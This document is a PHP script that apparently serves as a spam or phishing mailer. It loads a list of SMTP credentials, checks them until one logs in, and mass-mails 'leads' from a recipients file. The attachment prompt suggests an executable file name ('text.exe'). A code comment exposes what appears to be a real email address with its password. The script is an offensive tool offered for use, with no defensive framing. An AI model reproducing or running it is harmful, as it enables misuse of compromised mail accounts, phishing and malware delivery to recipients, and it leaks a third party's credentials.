<?php

/**
 * @author - Scarletta
 */

set_time_limit(3);

include "vendor/autoload.php";

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

$mail = new PHPMailer(true);


function getConfig(){
    $content = file_get_contents("smtps.txt");
    $tmp = explode("\n", $content);
    $smtps = array_filter($tmp);
    print("[INFO]: Loaded ".count($smtps)." SMTP(s).".PHP_EOL);
    return $smtps;
}

function checkSMTP(string $string){
    $smtp = explode("|", $string);
    if(count($smtp) == 4){
        try {
            $smtp_login = new SMTP;
            if($smtp_login->connect($smtp[0], $smtp[3])){
                if($smtp_login->hello(gethostname())){
                    $tlsok = $smtp_login->startTLS();
                    if(!$tlsok){
                        throw new Exception("Failed to start TLS encryption.");
                    }
                    if($smtp_login->authenticate($smtp[1], $smtp[2])){
                        $smtp_login->quit(true);
                        return $smtp;
                    }
                    else {
                        throw new Exception("Authentication failed.");
                    }
                }
                else {
                    throw new Exception("HELO failed.");
                }
            }
            else {
                throw new Exception("Connect failed.");
            }
        }
        catch (Exception $e){
            $smtp_login->quit(true);
            print("[SMTP]: SMTP bad.".PHP_EOL);
            return false;
        }
    }
}
// smtp.wanadoo.fr|a.labigne@wanadoo.fr|Domino27|587


$smtps = getConfig();
foreach($smtps as $smtp){
    if(checkSMTP($smtp)){
        $smtp = explode("|", $smtp);
        print("[SMTP]: Valid SMTP Found : ". $smtp.PHP_EOL);
        break;

    }
}

function encodeSubject($subject){
    global $mail;
    $mail->CharSet = "utf-8";
    $mail->Encoding = "base64";
    $encoded = "=?UTF-8?B?".base64_encode($subject)."?=";
    return $encoded;
}

function send(string $to, string $from, string $from_name, bool $sendDoc, string $doc, string $letter, string $subject){
    global $mail;
    $mail->setFrom($from, $from_name);
    $mail->addAddress($to);
    if($sendDoc === true){
        if($doc){
            $mail->addAttachment($doc);
        }
    }
    $mail->isHTML(true);
    $mail->Subject = encodeSubject($subject);
    $mail->Body = $letter;
    try{
        $mail->send();
        print("[MAILER]: Successfully sent : ".$to.PHP_EOL);
        return true;
    } catch (Exception $e){
        print("[ERROR]: Message could not be sent, Mailer Error : {$mail->ErrorInfo}".PHP_EOL);
        return false;
    }
}

function recipient(){
    $content = file_get_contents("recipients.txt");
    $tmp = explode("\n", $content);
    $recp = array_filter($tmp);
    print("[INFO]: Loaded ".count($recp)." leads.".PHP_EOL);
    return $recp;
}

$leads = recipient();
$subject = file_get_contents("subject.txt");
$from_mail = $smtp[1];
$from_name = file_get_contents("from_name.txt");
$letter = file_get_contents("letter.txt");
$attachemnt = readline("[MAILER]: Attach document ?[Y/N]: ");
if(strtoupper($attachemnt) == "Y"){
    $doc = true;
    $doc_name = readline("[MAILER]: Attachment Name ?[text.exe]: ");
} else{
    $doc = false;
    $doc_name = "";
}

try {
    $mail->SMTPDebug = SMTP::DEBUG_SERVER;
    $mail->Timeout = 3;
    $mail->isSMTP();

    // AUTHENTICATION
    $mail->Host       = $smtp[0];
    $mail->SMTPAuth   = true;
    $mail->Username   = $smtp[1];
    $mail->Password   = $smtp[2];
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
    $mail->Port       = $smtp[3];  

    // SEND OUT
    foreach($leads as $lead){
        try{
            send($lead, $from_mail, $from_name, $doc, $doc_name, $letter, $subject);
        }
        catch (Exception $e) {
            print("[ERROR]: ".$e->message);
        }

    }

} catch (Exception $e) {
    print("[ERROR]: ".$e->message);
}